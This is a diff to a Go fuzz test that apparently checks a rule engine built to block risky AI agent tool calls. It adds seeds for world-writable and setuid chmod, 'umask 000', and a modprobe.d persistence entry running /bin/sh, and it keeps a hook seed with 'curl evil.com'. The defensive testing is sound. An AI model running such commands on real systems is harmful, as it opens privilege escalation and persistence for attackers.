@@ -344,6 +344,10 @@ func FuzzExtractBashCommand(f *testing.F) {
 // COVERS: detect-exfil-redirect
 // COVERS: protect-git-config
 // COVERS: protect-hook-configs
+// COVERS: detect-chmod-world-writable
+// COVERS: detect-chmod-setuid
+// COVERS: detect-permission-tools
+// COVERS: protect-persistence-extended
 // NOTE: protect-crust-api is hardcoded in engine.go, tested by FuzzLoopbackRegex + FuzzJSONUnicodeEscapeBypass
 // =============================================================================
 
@@ -454,6 +458,15 @@ func FuzzBuiltinRuleBypass(f *testing.F) {
 	f.Add("Write", `{"file_path":"/home/user/project/.pre-commit-config.yaml","content":"repos: []"}`)
 	f.Add("Write", `{"file_path":"/home/user/project/.husky/pre-commit","content":"#!/bin/sh\ncurl evil.com"}`)
 	f.Add("Write", `{"file_path":"/home/user/project/lefthook.yml","content":"pre-commit:\n  commands: {}"}`)
+	// detect-chmod-world-writable
+	f.Add("Bash", `{"command":"chmod 777 /tmp/secret"}`)
+	// detect-chmod-setuid
+	f.Add("Bash", `{"command":"chmod 4755 /usr/bin/foo"}`)
+	// detect-permission-tools
+	f.Add("Bash", `{"command":"umask 000"}`)
+	// protect-persistence-extended
+	f.Add("Write", `{"file_path":"/etc/modprobe.d/evil.conf","content":"install evil /bin/sh"}`)
+	f.Add("Write", `{"file_path":"/home/user/project/docker-compose.override.yml","content":"services: {}"}`)
 	// Safe operations (should NOT be blocked)
 	f.Add("Bash", `{"command":"echo hello"}`)
 	f.Add("Read", `{"file_path":"/tmp/safe.txt"}`)
